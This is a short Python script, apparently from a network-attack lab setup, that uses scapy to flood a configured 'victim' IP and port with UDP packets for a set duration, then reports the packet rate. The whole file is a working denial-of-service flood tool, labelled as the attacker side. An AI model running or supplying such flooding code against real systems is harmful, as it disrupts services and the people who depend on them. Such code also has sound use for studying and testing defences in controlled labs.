from scapy.all import IP, UDP, Raw, send
import time
import yaml
from pathlib import Path

config_path = Path(__file__).parent / "config.yaml"
with open(config_path) as f:
    cfg = yaml.safe_load(f)

DST_IP = cfg["network"]["victim_ip"]
DST_PORT = cfg["attack"]["target_port"]
SRC_PORT = cfg["attack"]["source_port"]
DURATION = cfg["attack"]["duration"]
PAYLOAD = b"A" * cfg["attack"]["payload_size"]

print(f"[attacker] Flooding {DST_IP}:{DST_PORT} for {DURATION}s")

start = time.time()
end_time = start + DURATION
count = 0

while time.time() < end_time:
    pkt = IP(dst=DST_IP) / UDP(dport=DST_PORT, sport=SRC_PORT) / Raw(load=PAYLOAD)
    send(pkt, verbose=False)
    count += 1

elapsed = time.time() - start
rate = count / elapsed if elapsed > 0 else 0
print(f"[attacker] Sent {count} packets in {elapsed:.2f}s ({rate:.2f} pkt/s)")
